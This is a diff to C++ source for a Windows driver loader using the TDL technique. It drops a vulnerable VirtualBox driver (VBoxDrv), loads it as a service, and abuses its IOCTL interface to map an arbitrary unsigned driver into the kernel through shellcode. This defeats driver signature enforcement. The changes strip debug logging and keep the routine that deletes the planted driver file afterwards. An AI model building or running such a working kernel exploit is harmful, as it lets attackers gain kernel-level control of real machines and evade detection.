@@ -47,8 +47,9 @@ HANDLE StartVulnerableDriver(SC_HANDLE hSCManager)
 {
     using namespace misc;
     
-    HANDLE hVulnerableDriver = INVALID_HANDLE_VALUE;
-    BOOL vbox_installed = IsVBoxInstalled();
+    HANDLE  hVulnerableDriver = INVALID_HANDLE_VALUE;
+    BOOL    vbox_installed = IsVBoxInstalled();
+
     if(vbox_installed) {
         if(!StopVBoxServices(hSCManager) || !BackupVBoxDriver())
             return INVALID_HANDLE_VALUE;
@@ -57,15 +58,11 @@ HANDLE StartVulnerableDriver(SC_HANDLE hSCManager)
     winnt::write_file(szVBoxDriver, SHELLCODE_VULNERABLE_DRIVER, SHELLCODE_VULNERABLE_DRIVER_SIZE);
 
     if(!vbox_installed) {
-        LOG(DEBUG) << "Adding VBoxDrv to the database";
         winnt::create_service(hSCManager, L"VBoxDrv", szVBoxDriver);
     }
 
     if(succeeded(winnt::start_driver(hSCManager, L"VBoxDrv"))) {
-        if(!succeeded(winnt::get_driver_device(L"VBoxDrv", &hVulnerableDriver)))
-            LOG(DEBUG) << "VBoxDrv device open failure";
-    } else {
-        LOG(DEBUG) << "Failed to load VBoxDrv";
+        winnt::get_driver_device(L"VBoxDrv", &hVulnerableDriver);
     }
     return hVulnerableDriver;
 }
@@ -73,28 +70,27 @@ BOOL StopVulnerableDriver(SC_HANDLE hSCManager, HANDLE hVulnerableDriver)
 {
     using namespace misc;
 
-    UNICODE_STRING     uStr;
-    OBJECT_ATTRIBUTES  ObjectAttributes;
+    UNICODE_STRING      uStr;
+    OBJECT_ATTRIBUTES   ObjectAttributes;
 
     if(hVulnerableDriver != INVALID_HANDLE_VALUE)
         CloseHandle(hVulnerableDriver);
 
     if(!succeeded(winnt::stop_driver(hSCManager, L"VBoxDrv"))) {
-        LOG(DEBUG) << "Unexpected error while unloading driver";
+        return FALSE;
     }
 
     if(!IsVBoxInstalled()) {
         if(!succeeded(winnt::delete_service(hSCManager, L"VBoxDrv")))
-            LOG(DEBUG) << "Error removing driver entry from registry";
+            return FALSE;
 
         RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
         InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
-        if(!succeeded(NtDeleteFile(&ObjectAttributes)))
-            LOG(DEBUG) << "Error removing driver file";
-    } else {
-        if(!RestoreVBoxDriver())
-            LOG(DEBUG) << "Unexpected error while restoring original driver";
 
+        if(!succeeded(NtDeleteFile(&ObjectAttributes)))
+            return FALSE;
+    } else {
+        RestoreVBoxDriver();
     }
     return TRUE;
 }
@@ -259,7 +255,6 @@ void TDLExploit(
         if(!DeviceIoControl(hVBox, SUP_IOCTL_COOKIE,
             &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
             SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL)) {
-            LOG(ERROR) << "TDL: SUP_IOCTL_COOKIE call failed";
             break;
         }
 
@@ -276,7 +271,6 @@ void TDLExploit(
         if(!DeviceIoControl(hVBox, SUP_IOCTL_LDR_OPEN, &OpenLdr,
             SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
             SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL)) {
-            LOG(ERROR) << "TDL: SUP_IOCTL_LDR_OPEN call failed";
             break;
         }
         //else {
@@ -311,7 +305,6 @@ void TDLExploit(
         if(!DeviceIoControl(hVBox, SUP_IOCTL_LDR_LOAD,
             pLoadTask, pLoadTask->Hdr.cbIn,
             pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL)) {
-            LOG(ERROR) << "TDL: SUP_IOCTL_LDR_LOAD call failed";
             break;
         }
 
@@ -327,7 +320,6 @@ void TDLExploit(
         if(!DeviceIoControl(hVBox, SUP_IOCTL_SET_VM_FOR_FAST,
             &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
             &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL)) {
-            LOG(DEBUG) << "TDL: SUP_IOCTL_SET_VM_FOR_FAST call failed";
             break;
         }
 
@@ -388,7 +380,6 @@ long __stdcall TDLMapDriver(
         RtlInitUnicodeString(&uStr, lpDriverFullName);
         status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&Image);
         if((!succeeded(status)) || (Image == NULL)) {
-            LOG(ERROR) << "TDL: Error. Input driver not loaded";
             break;
         }
 
@@ -401,20 +392,17 @@ long __stdcall TDLMapDriver(
         RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
         status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&KernelImage);
         if((!succeeded(status)) || (KernelImage == 0)) {
-            LOG(ERROR) << "TDL: Error. ntoskrnl.exe not loaded";
             break;
         }
         RtlInitString(&routineName, "ExAllocatePoolWithTag");
         status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xExAllocatePoolWithTag);
         if((!succeeded(status)) || (xExAllocatePoolWithTag == 0)) {
-            LOG(ERROR) << "TDL: Error. ExAllocatePoolWithTag not found";
             break;
         } 
 
         RtlInitString(&routineName, "PsCreateSystemThread");
         status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xPsCreateSystemThread);
         if((!succeeded(status)) || (xPsCreateSystemThread == 0)) {
-            LOG(ERROR) << "TDL: Error. PsCreateSystemThread not found";
             break;
         }
 
@@ -422,7 +410,6 @@ long __stdcall TDLMapDriver(
         NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&Buffer, 0, &memIO,
             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if(Buffer == NULL) {
-            LOG(ERROR) << "TDL: Error, unable to allocate shellcode";
             break;
         }
 
@@ -477,9 +464,7 @@ long __stdcall TDLload_driver(
 
     HANDLE hVulnerableDriver = StartVulnerableDriver(hSCManager);
     if(hVulnerableDriver != INVALID_HANDLE_VALUE) {
-        if(!succeeded(status = TDLMapDriver(hVulnerableDriver, lpDriverFullName))) {
-            LOG(DEBUG) << "Failed to map driver.";
-        } 
+        status = TDLMapDriver(hVulnerableDriver, lpDriverFullName);
         StopVulnerableDriver(hSCManager, hVulnerableDriver);
     } else {
         status = STATUS_UNSUCCESSFUL;
